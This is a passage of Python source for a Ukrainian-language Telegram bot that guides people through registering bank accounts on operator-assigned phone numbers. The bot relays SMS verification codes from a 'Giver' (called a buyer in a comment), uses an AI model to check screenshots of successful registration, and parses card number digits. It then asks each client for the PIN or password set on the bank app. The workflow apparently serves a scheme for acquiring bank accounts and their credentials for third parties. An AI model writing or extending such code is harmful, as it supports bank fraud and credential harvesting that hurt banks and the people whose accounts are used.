            current_bank_name=current_bank_name,
            chat_history=chat_history
        )
        
        if "[SUCCESS_VERIFICATION]" in response:
            bank_label = current_bank_name if current_bank_name else "банк"
            await message.answer(
                f"Чудово! Будь ласка, надішліть скріншот, який підтверджує успішну реєстрацію в {bank_label}.",
                reply_markup=ReplyKeyboardRemove()
            )
            return

        # Додаємо повідомлення в історію, якщо це не успішна верифікація
        user_msg = {"role": "user", "content": message.text}
        
        raw_response = response
        if "\n\nЯ всього автоматизатор" in response:
            raw_response = response.split("\n\nЯ всього автоматизатор")[0].strip()
        assistant_msg = {"role": "assistant", "content": raw_response}
        
        chat_history.append(user_msg)
        chat_history.append(assistant_msg)
        chat_history = chat_history[-10:] # Зберігаємо останні 10 повідомлень
        await state.update_data(chat_history=chat_history)

        await message.answer(response)
        return

    # Якщо користувач не у стані анкетування, пропонуємо йому почати з команди /start
    await message.answer("Для початку верифікації напишіть **/start**.", parse_mode="Markdown")

@router.message(F.chat.type == "private", F.photo)
async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
    """Обробник скріншотів/зображень від користувача (ШІ розпізнавання помилок)"""
    client_id = message.from_user.id
    
    # Перевіряємо, чи є вже активна сесія
    existing_session = await db.get_session(client_id)
    if existing_session:
        if existing_session['status'] == 'registered':
            await message.answer("Будь ласка, зачекайте, поки адміністратор призначить вам номер телефону для початку верифікації.")
            return
        elif existing_session['status'] in ('number_assigned', 'waiting_code'):
            # Беремо фото найкращої якості
            photo = message.photo[-1]
        
        # Зберігаємо останнє фото в стані для можливості відновлення анкетування текстом
        await state.update_data(last_photo_id=photo.file_id)
        
        # 1. Перевіряємо, чи підпис до фото свідчить про невірний код / код не підійшов
        if message.caption and is_wrong_code_text(message.caption):
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Так, потрібен новий код", callback_data="wrongcode_yes")],
                [InlineKeyboardButton(text="Ні, все гаразд", callback_data="wrongcode_no")]
            ])
            await message.answer("Не підійшов код?", reply_markup=keyboard)
            await state.set_state(RegistrationStates.waiting_wrong_code_confirm)
            return

        # 2. Перевіряємо, чи підпис до фото схожий на запит SMS-коду
        if message.caption and is_code_request_text(message.caption):
            async def notify(msg: str, is_error: bool = False, is_retry: bool = False):
                await message.answer(msg)
            await trigger_sms_code_request(client_id, bot, state, notify)
            return
            
        await bot.send_chat_action(chat_id=client_id, action="typing")
        
        # Отримуємо додатковий контекст для ШІ
        line_id = existing_session['line_id']
        line_info = await db.get_line(line_id) if line_id else None
        current_bank_name = line_info['bank'] if line_info else None
        client_data = existing_session['client_data']
        
        import io
        photo_file = await bot.get_file(photo.file_id)
        photo_bytes = io.BytesIO()
        await bot.download_file(photo_file.file_path, photo_bytes)
        photo_data = photo_bytes.getvalue()
        
        # 3. Перевірка на повністю чорний скріншот для EcoBank (через політику безпеки)
        is_ecobank = current_bank_name and "eco" in current_bank_name.lower()
        if is_ecobank and is_image_completely_black(photo_data):
            bank_label = current_bank_name if current_bank_name else "EcoBank"
            success_text = (
                f"Чудово {bank_label} успішно зареєстрували.\n\n"
                f"Який пін-код чи пароль ставили на додаток?"
            )
            await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
            await state.update_data(success_photo_id=photo.file_id)
            await db.update_session_verification_data(client_id, success_photo_id=photo.file_id, card_first4=None, card_last4=None)
            await state.set_state(RegistrationStates.waiting_password)
            return
        
        from bot.openai_client import get_support_response
        response = await get_support_response(
            user_text=message.caption,
            image_bytes=photo_data,
            client_data=client_data,
            current_bank_name=current_bank_name
        )
        
        if "[SUCCESS_VERIFICATION]" in response:
            # Перевіряємо, чи це bank.kd
            is_bank_kd = current_bank_name and "bank.kd" in current_bank_name.lower()

            # Парсимо маску картки, якщо вона є
            card_first4, card_last4 = None, None
            card_match = re.search(r'\[CARD_MASK:\s*(\d{4})\.\.\.(\d{4})\]', response)
            if card_match:
                card_first4 = card_match.group(1)
                card_last4 = card_match.group(2)
                await state.update_data(card_first4=card_first4, card_last4=card_last4)
            
            bank_label = current_bank_name if current_bank_name else "банк"
            
            if is_bank_kd:
                kd_prompt = (
                    "Дякую! Перший скріншот прийнято.\n\n"
                    "Тепер, будь ласка, перейдіть у вкладку \"Картки\" (або натисніть на саму картку), "
                    "щоб було видно її номер, та надішліть другий скріншот для перевірки реквізитів."
                )
                await message.answer(kd_prompt, reply_markup=ReplyKeyboardRemove())
                await state.update_data(success_photo_id=photo.file_id)
                await db.update_session_verification_data(client_id, success_photo_id=photo.file_id, card_first4=card_first4, card_last4=card_last4)
                await state.set_state(RegistrationStates.waiting_card_screenshot)
                return
            else:
                success_text = (
                    f"Чудово {bank_label} успішно зареєстрували.\n\n"
                    f"Який пін-код чи пароль ставили на додаток?"
                )
                await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
                await state.update_data(success_photo_id=photo.file_id)
                await db.update_session_verification_data(client_id, success_photo_id=photo.file_id, card_first4=card_first4, card_last4=card_last4)
                await state.set_state(RegistrationStates.waiting_password)
                return

        await message.answer(response)
        return
        
    await message.answer("Для початку верифікації напишіть **/start**.", parse_mode="Markdown")
async def schedule_waiting_code_reminder(client_id: int, bot: Bot):
    """
    Через 20 секунд перевіряє статус сесії.
    Якщо статус досі 'waiting_code', надсилає повідомлення клієнту.
    """
    await asyncio.sleep(20)
    session = await db.get_session(client_id)
    if session and session['status'] == 'waiting_code':
        try:
            await bot.send_message(
                chat_id=client_id,
                text="Ще очікую поки нададуть код"
            )
        except Exception as e:
            print(f"Помилка надсилання автоматичного нагадування клієнту {client_id}: {e}")

async def trigger_sms_code_request(client_id: int, bot: Bot, state: FSMContext, notify_fn) -> bool:
    """
    Уніфікована логіка запиту SMS-коду з перевіркою cooldown (30 сек).
    """
    import time
    state_data = await state.get_data()
    last_request_time = state_data.get("last_code_request_time", 0)
    current_time = time.time()
    
    cooldown = 30
    elapsed = current_time - last_request_time
    if elapsed < cooldown:
        remaining = int(cooldown - elapsed)
        await notify_fn(f"Почекайте ще {remaining} сек. перед наступним запитом коду!", is_error=True)
        return False
        
    session = await db.get_session(client_id)
    if not session or session['status'] == 'completed':
        await notify_fn("Сесія не знайдена або вже завершена.", is_error=True)
        return False
        
    line_id = session['line_id']
    if not line_id:
        await notify_fn("Вам ще не призначено лінію.", is_error=True)
        return False
 
    line_info = await db.get_line(line_id)
    bank_name = line_info['bank'] if line_info else "Невідомий банк"

    is_retry = session['status'] == 'waiting_code'

    # Оновлюємо статус сесії на очікування коду
    await db.set_session_status(client_id, 'waiting_code')
    await state.update_data(last_code_request_time=current_time)
    
    # Запускаємо таймер на 20 секунд для автоматичного сповіщення клієнта
    asyncio.create_task(schedule_waiting_code_reminder(client_id, bot))

    # Отримуємо шаблони повідомлень для скупщика (Giver) з бази даних
    giver_format = await db.get_setting("giver_request_format", "Запрос {line_id} {bank_name}")
    giver_retry_format = await db.get_setting("giver_request_retry_format", "Запрос {line_id} {bank_name} (ПОВТОРНО)")

    if is_retry:
        await notify_fn("Запит на код відправлено постачальнику. Будь ласка, очікуйте.", is_error=False, is_retry=True)
        try:
            giver_msg = giver_retry_format.format(line_id=line_id, bank_name=bank_name)
        except Exception:
            giver_msg = f"Запрос {line_id} {bank_name} (ПОВТОРНО)"
    else:
        await notify_fn("Запит на код відправлено постачальнику. Будь ласка, очікуйте, код прийде сюди.", is_error=False, is_retry=False)
        try:
            giver_msg = giver_format.format(line_id=line_id, bank_name=bank_name)
        except Exception:
            giver_msg = f"Запрос {line_id} {bank_name}"

    # Надсилаємо запит постачальнику кодів (Giver)
    from bot.config import GIVER_CHAT_ID
    try:
        await bot.send_message(chat_id=GIVER_CHAT_ID, text=giver_msg)
    except Exception as e:
        # Якщо не вдалося надіслати гіверу, повідомляємо адміна
        await bot.send_message(
            chat_id=ADMIN_ID,
            text=f"Помилка надсилання запиту гіверу (Line {line_id}): {str(e)}"
        )
    return True

@router.callback_query(F.data == "request_code")
async def process_request_code(callback: CallbackQuery, bot: Bot, state: FSMContext):
    """Обробник натискання кнопки 'Запросити SMS-код' клієнтом"""
    client_id = callback.from_user.id
    
    async def notify(msg: str, is_error: bool = False, is_retry: bool = False):
        if is_error:
            await callback.answer(msg, show_alert=True)
        else:
            await callback.message.answer(msg)
            await callback.answer("Запит відправлено!")
            
    await trigger_sms_code_request(client_id, bot, state, notify)

@router.callback_query(F.data == "wrongcode_yes")
async def handle_wrongcode_yes(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.answer(
        "Надішліть новий код, як надішлете в мене також запросіть новий SMS-код",
        parse_mode="Markdown"
    )
    await callback.answer()

@router.callback_query(F.data == "wrongcode_no")
async def handle_wrongcode_no(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.answer("Добре! Продовжуйте реєстрацію.")
    await callback.answer()

@router.message(RegistrationStates.waiting_wrong_code_confirm, F.chat.type == "private")
async def process_wrong_code_confirm_text(message: Message, state: FSMContext):
    t = message.text.lower().strip()
    yes_words = ["так", "yes", "да", "дп", "ага", "угу", "треба", "потрібен", "новий", "давай", "так потрібен"]
    no_words = ["ні", "no", "нет", "все добре", "все нормально", "все ок", "ок", "не треба", "ні все добре"]
    
    is_yes = False
    is_no = False
    
    for w in yes_words:
        if w in t:
            is_yes = True
            break
            
    for w in no_words:
        if w in t:
            is_no = True
            break
            
    if is_yes:
        await state.clear()
        await message.answer(
            "Надішліть новий код, як надішлете в мене також запросіть новий SMS-код",
            parse_mode="Markdown"
        )
    elif is_no:
        await state.clear()
        await message.answer("Добре! Продовжуйте реєстрацію.")
    else:
        await message.answer(
            "Будь ласка, оберіть відповідь на кнопках нижче або напишіть 'так' чи 'ні':"
        )
